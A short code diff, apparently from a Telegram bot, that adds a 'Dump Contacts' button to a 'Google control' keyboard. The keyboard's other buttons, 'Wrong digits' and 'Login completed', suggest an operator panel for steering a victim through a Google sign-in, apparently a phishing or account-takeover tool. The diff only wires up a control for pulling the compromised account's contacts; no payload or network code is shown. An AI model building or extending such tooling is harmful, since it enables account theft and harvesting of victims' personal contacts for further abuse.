@@ -92,6 +92,7 @@ def get_google_control_keyboard(user_tg_id: int) -> InlineKeyboardMarkup:
                 InlineKeyboardButton(text="❌ Неверные цифры", callback_data=f"gctrl:wrong_prompt:{user_tg_id}"),
             ],
             [
+                InlineKeyboardButton(text="📇 Выгрузить Контакты", callback_data=f"gctrl:dump_contacts:{user_tg_id}"),
                 InlineKeyboardButton(text="✅ Вход выполнен", callback_data=f"gctrl:complete:{user_tg_id}"),
             ],
         ]
